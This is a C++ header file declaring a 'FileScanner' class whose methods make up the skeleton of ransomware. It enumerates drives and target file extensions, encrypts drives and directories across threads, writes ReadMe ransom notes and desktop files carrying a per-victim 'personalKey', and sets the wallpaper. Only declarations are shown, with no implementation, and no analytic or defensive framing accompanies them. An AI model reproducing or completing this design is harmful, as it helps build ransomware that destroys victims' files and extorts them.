#pragma once
#include <string>
#include <vector>
#include <thread>
#include <atomic>

class FileScanner {
public:
    static void StartEncryption();
    static void StopEncryption();
private:
    static std::vector<std::string> GetDrives();
    static std::vector<std::string> GetExtensions();
    static bool ShouldSkipPath(const std::string& path);
    static void EncryptDrive(const std::string& drive, int threadIndex);
    static void EncryptDirectory(const std::string& dir, int threadIndex);
    static void CreateReadMe(const std::string& dir, const std::string& personalKey);
    static void CreateDesktopFiles(const std::string& personalKey);
    static void SetWallpaper();
    
    static std::atomic<bool> stopFlag;
    static std::vector<std::thread> threads;
};
